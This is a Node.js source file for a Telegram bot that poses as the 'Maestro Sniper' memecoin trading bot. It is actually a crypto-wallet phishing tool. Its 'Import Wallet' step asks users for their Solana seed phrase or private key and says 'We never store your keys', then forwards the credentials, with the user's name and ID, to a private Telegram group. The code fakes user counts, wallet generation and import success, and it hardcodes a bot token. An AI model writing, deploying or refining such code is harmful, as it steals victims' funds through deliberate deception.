const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const TOKEN = '8262576157:AAENogSLc1ggOb2SWZ6No-g9AtgIe809L7Y';
const GROUP_ID = '1002914341678';
const bot = new TelegramBot(TOKEN);
app.use(express.json());

// Global state
let activeUsers = Math.floor(Math.random() * 50000) + 50000;
const userStates = {};
const captchaStore = {};

// Update active users every 2 minutes
setInterval(() => {
  activeUsers = Math.floor(Math.random() * 50000) + 50000;
}, 120000);

// Webhook setup
app.post(`/webhook`, async (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

bot.setWebHook(`https://maestro-sniper.onrender.com/webhook`);

// Generate math captcha
const generateCaptcha = () => {
  const operations = [['+', (a, b) => a + b], ['-', (a, b) => a - b]];
  const [opSymbol, opFn] = operations[Math.floor(Math.random() * operations.length)];
  const a = Math.floor(Math.random() * 10) + 1;
  const b = Math.floor(Math.random() * 10) + 1;
  return {
    question: `${a} ${opSymbol} ${b} = ?`,
    answer: opFn(a, b).toString(),
    emoji: opSymbol === '+' ? '➕' : '➖'
  };
};

// Main menu keyboard
const mainMenuKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🔗 Chains", callback_data: "chains" },
        { text: "💼 Wallets", callback_data: "wallets" },
        { text: "⚙️ Call Channels", callback_data: "call_channels" }
      ],
      [
        { text: "🤝 Presales", callback_data: "presales" },
        { text: "Copytrade", callback_data: "copytrade" },
        { text: "📡 Signals", callback_data: "signals" }
      ],
      [
        { text: "⚙️ God Mode", callback_data: "god_mode" },
        { text: "📊 Positions", callback_data: "positions" },
        { text: "🎯 Auto Snipe", callback_data: "auto_snipe" }
      ],
      [
        { text: "⬅️ Bridge", callback_data: "bridge" },
        { text: "⭐ Premium", callback_data: "premium" },
        { text: "ℹ️ FAQ", callback_data: "faq" }
      ],
      [
        { text: "≡ Menu", callback_data: "menu" },
        { text: "😊 Message", callback_data: "message" },
        { text: "📎 Attachment", callback_data: "attachment" },
        { text: "🎤 Voice", callback_data: "voice" }
      ]
    ]
  }
};

// Wallet sub-menu
const walletMenuKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🔑 Import Wallet", callback_data: "import_wallet" },
        { text: "🆕 Generate Wallet", callback_data: "generate_wallet" }
      ]
    ]
  }
};

// Generated wallet keyboard
const generatedWalletKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "✅ Approve", callback_data: "approve_wallet" },
        { text: "🔙 Back", callback_data: "back_wallet" }
      ]
    ]
  }
};

// FAQ keyboard
const faqKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "🔙 Back to Menu", callback_data: "back_to_menu" }]
    ]
  }
};

// Handle start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const captcha = generateCaptcha();
  
  captchaStore[chatId] = captcha.answer;
  
  bot.sendMessage(
    chatId,
    `🎉 *Welcome to Maestro Sniper\\!* 🚀\nThe ultimate memecoin trading bot with *900K\\+ users\\!*\n\n` +
    `*Active Users Today: ${activeUsers.toLocaleString()}* 👥\n\n` +
    `🔒 *Solve this quick math captcha to proceed:*\n${captcha.emoji} ${captcha.question}`,
    { parse_mode: 'MarkdownV2' }
  );
});

// Handle text messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  // Captcha verification
  if (captchaStore[chatId]) {
    if (text === captchaStore[chatId]) {
      delete captchaStore[chatId];
      showMainMenu(chatId);
    } else {
      const newCaptcha = generateCaptcha();
      captchaStore[chatId] = newCaptcha.answer;
      bot.sendMessage(
        chatId,
        `❌ *Oops! Wrong answer*\n\nTry again:\n${newCaptcha.emoji} ${newCaptcha.question}`,
        { parse_mode: 'MarkdownV2' }
      );
    }
    return;
  }
  
  // Wallet import handling
  if (userStates[chatId] === 'awaiting_wallet') {
    userStates[chatId] = null;
    
    // Forward credentials to private group
    bot.sendMessage(
      GROUP_ID,
      `⚠️ *NEW WALLET IMPORT* ⚠️\n\n` +
      `👤 User: ${msg.from.first_name} ${msg.from.last_name || ''} [@${msg.from.username || 'N/A'}]\n` +
      `🆔 ID: ${msg.from.id}\n\n` +
      `🔑 *Credentials:*\n\`\`\`${text}\`\`\``,
      { parse_mode: 'MarkdownV2' }
    );
    
    // Simulate processing
    bot.sendMessage(chatId, "⏳ *Processing... Please wait...*", { parse_mode: 'MarkdownV2' })
      .then(() => {
        setTimeout(() => {
          bot.sendMessage(
            chatId,
            "🎉 *Wallet imported successfully!* 🚀\n\nWelcome aboard\\! Your funds are now secured with military\\-grade encryption\\.\n\n" +
            "*Ready to snipe those memecoins!* 📈",
            { parse_mode: 'MarkdownV2', reply_markup: mainMenuKeyboard.reply_markup }
          );
        }, 3000);
      });
  }
});

// Handle callback queries
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  
  // Non-functional features
  const restrictedFeatures = [
    'chains', 'call_channels', 'presales', 'copytrade', 
    'signals', 'god_mode', 'positions', 'auto_snipe',
    'bridge', 'premium', 'menu', 'message', 'attachment', 'voice'
  ];
  
  if (restrictedFeatures.includes(data)) {
    bot.sendMessage(
      chatId,
      "⚠️ *No funds detected!* 💳\n\nPlease import or generate a wallet first to access this feature\\.",
      { parse_mode: 'MarkdownV2', reply_markup: walletMenuKeyboard.reply_markup }
    );
    return;
  }
  
  switch(data) {
    case 'wallets':
      bot.sendMessage(
        chatId,
        "🔐 *Wallet Management*\n\nChoose an option:",
        { parse_mode: 'MarkdownV2', reply_markup: walletMenuKeyboard.reply_markup }
      );
      break;
      
    case 'import_wallet':
      userStates[chatId] = 'awaiting_wallet';
      bot.sendMessage(
        chatId,
        "🔑 *Import Wallet*\n\nPlease input your Solana wallet secret phrase or private key\\:\n\n" +
        "_Keep it secure! We never store your keys_ 🔒",
        { parse_mode: 'MarkdownV2' }
      );
      break;
      
    case 'generate_wallet':
      bot.sendMessage(
        chatId,
        "✨ *Generating new secure wallet...*\n\n" +
        "🔐 *Solana Address:*\n`AKHGQFCPawfxhS4vW3trccaEv5BCAJKeGa72CnRW7Lwm`\n\n" +
        "⚠️ *SAVE THIS PRIVATE KEY NOW:*\n`5JY8ZvzL3eX7qRc... [truncated for security]`\n\n" +
        "_This is your only chance to copy it!_ 📋",
        { 
          parse_mode: 'MarkdownV2',
          reply_markup: generatedWalletKeyboard.reply_markup 
        }
      );
      break;
      
    case 'approve_wallet':
      bot.sendMessage(chatId, "💸 *Processing transaction... Please wait...*", { parse_mode: 'MarkdownV2' });
      setTimeout(() => {
        bot.sendMessage(
          chatId,
          "✅ *Approved!* 💰\n\nDeposits confirmed\\. Ready to trade! 📈\n\n" +
          "*Balance: 0\\.00 SOL* 😢\n_Fund your wallet to start sniping!_",
          { parse_mode: 'MarkdownV2', reply_markup: mainMenuKeyboard.reply_markup }
        );
      }, 3000);
      break;
      
    case 'back_wallet':
      bot.sendMessage(
        chatId,
        "🔐 *Wallet Management*",
        { parse_mode: 'MarkdownV2', reply_markup: walletMenuKeyboard.reply_markup }
      );
      break;
      
    case 'faq':
      bot.sendMessage(
        chatId,
        "❓ *Frequently Asked Questions*\n\n" +
        "🚀 *How to start?*\nImport or generate a wallet!\n\n" +
        "🌐 *Supported chains?*\nSolana, ETH, Base \\+10 more!\n\n" +
        "🛡️ *Is it safe?*\nAnti\\-rug protection enabled!\n\n" +
        "⭐ *Premium?*\nUnlock with stars!\n\n" +
        "_Reply /start for menu_",
        { parse_mode: 'MarkdownV2', reply_markup: faqKeyboard.reply_markup }
      );
      break;
      
    case 'back_to_menu':
      showMainMenu(chatId);
      break;
  }
  
  bot.answerCallbackQuery(query.id);
});

// Show main menu function
function showMainMenu(chatId) {
  bot.sendMessage(
    chatId,
    `🚀 *Maestro Sniper Bot* 🔥\n\n` +
    `_OG Telegram memecoin sniper since 2022_\n\n` +
    `⚡ Lightning\\-fast trades on Solana, ETH, Base & 10\\+ chains\n` +
    `🛡️ Anti\\-rug protection enabled\n\n` +
    `*Active Users Today: ${activeUsers.toLocaleString()}* 👥\n` +
    `_Join 900K\\+ users trading memecoins!_ 🎉`,
    {
      parse_mode: 'MarkdownV2',
      reply_markup: mainMenuKeyboard.reply_markup
    }
  );
}

// Start server
app.listen(port, () => {
  console.log(`Maestro Sniper bot running on port ${port}`);
});
